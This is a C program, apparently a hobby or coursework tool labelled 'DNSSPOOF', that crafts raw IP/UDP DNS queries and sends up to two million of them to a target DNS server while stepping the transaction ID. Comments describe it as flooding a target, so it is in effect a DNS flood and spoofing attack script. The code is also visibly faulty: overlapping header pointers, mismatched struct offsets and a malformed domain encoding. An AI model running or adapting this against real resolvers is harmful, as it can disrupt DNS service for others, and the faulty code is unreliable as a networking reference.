#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/udp.h>
#include <linux/ip.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include "header.h"

//add 6 bytes for a message DNSSPO, original == 8192
#define PCKT_LEN 8192
//#define PCKT_LEN 1200
#define MY_DEST_MAC0	0x11
#define MY_DEST_MAC1	0x11
#define MY_DEST_MAC2	0x11
#define MY_DEST_MAC3	0x00
#define MY_DEST_MAC4	0x00
#define MY_DEST_MAC5	0x00

int main(int argc, char *argv[]){
	// Create the socket to be used
	int c_socket;

	char m[] = "DNSSPOOF";

	printf("Hello World!\r\n");

	char *opt, *dnsServer, *alwaysUpHost;
	// Variable to set for finding the correct MAC address
	if( argc == 2){

		opt = argv[1];
		dnsServer = "192.168.1.1";
		alwaysUpHost = "192.168.1.1";
	}
	// This option is to set target dns server
	if( argc == 3){
		opt = argv[1];
		dnsServer = argv[2];	
		alwaysUpHost = argv[2];
	}
	// This option floods a target with dns requests. (Update to change packet type)

	
	// Create the message bundle that will be passed to the socket
	char buffer[PCKT_LEN];
	// Create the two packets, the IP packet and the UDP packet. Create a struct for the dns request
	struct ether_header *eh = (struct ether_header *) buffer;
	struct iphdr *iph = (struct iphdr *) (buffer);
	struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));

	struct dnsrequest *dns = (struct dnsrequest *) (buffer + sizeof(struct udpheader) + sizeof(struct iphdr));

	struct sockaddr_in source, destination;
	int one = 1;
	const int *val = &one;

	// Zero out memory of the message
	memset(buffer, 0, PCKT_LEN);
	// Create the RAW socket with UDP 
	c_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	// Error checks
	if(c_socket < 0){
		perror("error creating socket");

	}	
	else{
		printf("SOCK_RAW created with UDP\r\n");
	}
	struct sockaddr_ll sll;
	struct ifreq if_idx;
        memset(&sll, 0, sizeof(sll));
	memset(&if_idx, 0, sizeof(if_idx));

	strncpy(if_idx.ifr_name, opt, IFNAMSIZ - 1);
	if((ioctl(c_socket, SIOCGIFINDEX, &if_idx)) == -1){
		printf("error getting interface index...\r\n");
	}

	
	struct ifreq if_mac;


	memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, opt, IFNAMSIZ -1 );	
	if (ioctl(c_socket, SIOCGIFHWADDR, &if_mac) < 0)
   		 printf("error getting mac...");

	int tx_len = 0;

	/* Ethernet header */
	eh->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
	eh->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
	eh->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
	eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
	eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
	eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
	tx_len += sizeof(struct ether_header);
	
	// Fill all the entries of the UDP header
	// Set the address family


	struct ifreq ifr_address;

	ifr_address.ifr_addr.sa_family = AF_INET;

	strncpy(ifr_address.ifr_name, opt, IFNAMSIZ - 1);
	ioctl(c_socket, SIOCGIFADDR, &ifr_address);

	source.sin_family	 = AF_INET;
	
	destination.sin_family	 = AF_INET;
	

	// The desintation address is the address that will be used to connect to the socket, that is the destination address needs to be a valid address that can be connected to. You can the actually ip address of the IP packet bbut you still need to connect to a valid address.
	source.sin_addr.s_addr	 = inet_addr(inet_ntoa(((struct sockaddr_in *)&ifr_address.ifr_addr)->sin_addr));
	destination.sin_addr.s_addr	 = inet_addr(alwaysUpHost);
	
	// Fill all the entries of the IP header
	// IP header length
	iph->ihl	= 5;
	iph->version	= 4;
	iph->tot_len	= sizeof(struct iphdr) + sizeof(struct udpheader) + sizeof(struct dnsrequest);
	iph->frag_off	= 0;
	iph->ttl 	= 64;
	iph->protocol 	= 17;
	iph->saddr	= inet_addr(inet_ntoa(((struct sockaddr_in *)&ifr_address.ifr_addr)->sin_addr));
	iph->daddr 	= inet_addr(dnsServer);

	tx_len += sizeof(struct ipheader);


	udp->udph_destport	= htons(53);
	udp->udph_srcport	= htons(9999);
	udp->udph_len		= htons(sizeof(struct udpheader) + sizeof(struct dnsrequest));
	tx_len += sizeof(struct udpheader);

	// Setting up the dns packet, still needing to set the bytes up backwards :(
	dns->dns_flags = htons(0x0100); 
	dns->dns_questions = htons(0x0001);
	// We need to create a temp arry and memcpy it to the struct array. I do not know why but 
	// instead of periods I need to insert a weird byte value, 0x04 and 0x03
	dns->dns_wierdvalue = 0x04;
	char temp[12] = { 'e', 's', 'p', 'n', 0x03, 'c', 'o', 'm' };
	memcpy(dns->dns_request, temp, sizeof(temp));
	
	dns->dns_type = htons(0x0001);
	dns->dns_class = htons(0x0001);
	tx_len += sizeof(struct dnsrequest);
	printf("Trying...\n");

	printf("Using raw socket and UDP protocol\n");
	
	int count;
	int newDNSTransID = 9999;
	for(count = 1; count <= 2000000; count++)
	{
		dns->dns_transid = htons(newDNSTransID);
		/* I do not know what the deal is with this destination sockaddr stuff */
		if(sendto(c_socket, buffer, tx_len, 0, (struct sockaddr *)&destination, sizeof(destination)) < 0)
		{
		}
		else
		{
			newDNSTransID--;	
		}
	}	
	close(c_socket);
	return 0;
}
